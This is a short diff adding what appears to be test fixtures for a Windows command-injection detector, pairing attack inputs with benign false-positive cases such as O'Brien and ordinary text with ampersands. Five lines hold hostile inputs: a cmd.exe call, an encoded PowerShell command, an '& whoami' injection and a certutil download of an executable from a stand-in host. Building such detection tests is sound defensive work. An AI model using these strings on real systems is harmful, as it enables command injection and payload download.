@@ -1,0 +1,10 @@
+w1_cmd|x=cmd.exe /c dir
+w2_psenc|p=powershell -enc ZABpAHIA
+w3_sysroot|c=%SystemRoot%\system32\cmd.exe
+w4_amp_whoami|c=& whoami
+w5_certutil|d=certutil -urlcache -f http://x/a.exe
+neg_winword|q=windows update help please
+fp_obrien|q=O'Brien
+fp_lt_amp|q=earnings < $2000 & rent > $800
+fp_sqlwords|q=select a plan or drop coverage union
+fp_unicode|q=cafe senor naive resume
